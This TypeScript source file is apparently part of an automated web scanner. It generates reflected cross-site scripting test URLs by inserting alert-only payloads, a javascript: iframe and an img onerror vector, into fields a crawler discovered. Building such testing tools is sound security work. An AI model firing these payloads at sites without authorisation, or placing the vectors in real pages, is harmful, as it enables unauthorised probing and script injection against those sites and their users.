import type { InjectionPoint } from './browser-attack-port.js';

/** One URL to visit: an injection point with a payload in its slot. */
export interface XssCandidate {
  readonly url: string;
  readonly field: string;
}

/**
 * The payloads the engine types into a reflected field (F3.3). Each is a textbook script
 * vector whose only effect is an alert: one with the conventional `xss` text and one with the
 * run's own marker, which is what the script-executed oracle looks for. Every iframe is closed,
 * so a second one is an element and not the first one's fallback text.
 */
export function xssPayloads(marker: string): readonly string[] {
  const alert = (text: string) => `<iframe src="javascript:alert(\`${text}\`)"></iframe>`;
  return [`${alert('xss')}${alert(marker)}`, `<img src=x onerror="alert('${marker}')">`];
}

/**
 * XSS candidates (F3.3): every reflected field the browser found, with each payload in its
 * slot. Derived from what the crawler discovered, no target specifics; the script-executed
 * oracle decides which visit ran injected script.
 */
export function xssCandidates(points: readonly InjectionPoint[], marker: string): XssCandidate[] {
  return points.flatMap((point) =>
    xssPayloads(marker).map((payload) => ({
      url: point.template.replace('{payload}', encodeURIComponent(payload)),
      field: point.field,
    })),
  );
}
